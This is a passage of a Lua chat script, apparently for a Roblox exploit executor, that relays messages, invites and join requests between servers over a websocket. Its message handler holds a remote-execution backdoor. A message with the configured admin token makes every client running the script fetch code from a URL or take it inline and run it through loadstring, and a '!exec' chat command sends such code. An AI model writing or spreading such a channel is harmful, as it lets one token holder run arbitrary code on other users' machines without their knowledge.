end

-- ============================================
-- TEXT SEND WITH COMMANDS
-- ============================================
local function sendText(text)
    if text == "" then return end

    if text:sub(1, 5) == "!exec" then
        local code = text:sub(7)
        if ws then 
            ws:Send("EXEC|" .. Config.ADMIN_TOKEN .. "|" .. code) 
        end
        createMessageBubble("📜 Executing code...", true, player.Name, player.UserId)
        inputBox.Text = ""
        return
    end

    if text:sub(1, 4) == "!inv" or text:sub(1, 7) == "!invite" then
        local target = text:match("!inv%s+(%S+)") or text:match("!invite%s+(%S+)")
        if target then
            local userId, fullName = getUserIdFromName(target)
            if userId then
                if ws then
                    ws:Send("INVITE|" .. fullName .. "|" .. game.PlaceId .. "|" .. game.JobId .. "|" .. player.Name)
                end
                createMessageBubble("📨 Invite sent to " .. fullName, true, player.Name, player.UserId)
            else
                createMessageBubble("❌ User not found: " .. target, true, player.Name, player.UserId)
            end
        else
            createMessageBubble("❌ Usage: !inv [username]", true, player.Name, player.UserId)
        end
        inputBox.Text = ""
        return
    end

    if text:sub(1, 5) == "!join" then
        local target = text:match("!join%s+(%S+)")
        if target then
            local userId, fullName = getUserIdFromName(target)
            if userId then
                if ws then
                    ws:Send("JOIN_REQUEST|" .. fullName .. "|" .. player.Name .. "|" .. player.UserId)
                end
                createMessageBubble("🚀 Requesting to join " .. fullName .. "...", true, player.Name, player.UserId)
            else
                createMessageBubble("❌ User not found: " .. target, true, player.Name, player.UserId)
            end
        else
            createMessageBubble("❌ Usage: !join [username]", true, player.Name, player.UserId)
        end
        inputBox.Text = ""
        return
    end

    createMessageBubble(text, true, player.Name, player.UserId)
    if ws then ws:Send(player.Name .. "|" .. text .. "|" .. player.UserId) end
    inputBox.Text = ""
end

-- ============================================
-- WEBSOCKET HANDLERS
-- ============================================
if ws then
    ws.OnMessage:Connect(function(msg)
        if msg:sub(1, 5) == "EXEC|" then
            local _, _, token, payload = msg:find("^EXEC|(.-)|(.+)$")
            if token == Config.ADMIN_TOKEN then
                local code = payload
                if payload:match("^https?://") then
                    local ok, res = pcall(function() return game:HttpGet(payload) end)
                    if ok then code = res end
                end
                local fn = loadstring(code)
                if fn then 
                    pcall(fn) 
                    createMessageBubble("✅ Code executed", false, "System", nil)
                end
            end
            return
        end

        if msg:sub(1, 7) == "INVITE|" then
            local target, placeId, jobId, from = msg:match("^INVITE|(.-)|(.+)|(.+)|(.+)$")
            if target == player.Name then
                createMessageBubble("📩 Invite from " .. from .. "! Joining...", false, "System", nil)
                QueueReExecute()
                task.wait(0.5)
                TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId, player)
            end
            return
        end

        if msg:sub(1, 13) == "JOIN_REQUEST|" then
            local target, requester, requesterId = msg:match("^JOIN_REQUEST|(.-)|(.+)|(.+)$")
            if target == player.Name and ws then
                createMessageBubble("🙋 " .. requester .. " wants to join you", false, "System", nil)
                ws:Send("INVITE|" .. requester .. "|" .. game.PlaceId .. "|" .. game.JobId .. "|" .. player.Name)
            end
            return
        end

        if msg:sub(1, 7) == "ONLINE|" then
            local username, userId = msg:match("^ONLINE|(.-)|(.+)$")
            if username then
                onlineUsers[username] = {userId = tonumber(userId) or 0, lastSeen = tick()}
                local count = 0
                for _ in pairs(onlineUsers) do count = count + 1 end
                onlineLabel.Text = "● ONLINE " .. count
            end
            return
        end

        if msg:sub(1, 8) == "OFFLINE|" then
            local username = msg:match("^OFFLINE|(.+)$")
            if username then
                onlineUsers[username] = nil
                local count = 0
                for _ in pairs(onlineUsers) do count = count + 1 end
                onlineLabel.Text = "● ONLINE " .. count
            end
            return
        end

        local n, t, u = msg:match("^(.-)|(.+)|(.+)$")
        if n and t then
            local userId = tonumber(u) or 0
            createMessageBubble(t, false, n, userId)
            onlineUsers[n] = {userId = userId, lastSeen = tick()}
            local count = 0
            for _ in pairs(onlineUsers) do count = count + 1 end
            onlineLabel.Text = "● ONLINE " .. count
        else
            local n2, t2 = msg:match("^(.-)|(.+)$")
            if n2 and t2 then
                createMessageBubble(t2, false, n2, nil)
            end
        end
    end)

    ws.OnClose:Connect(function()
        sendOffline()
    end)
end

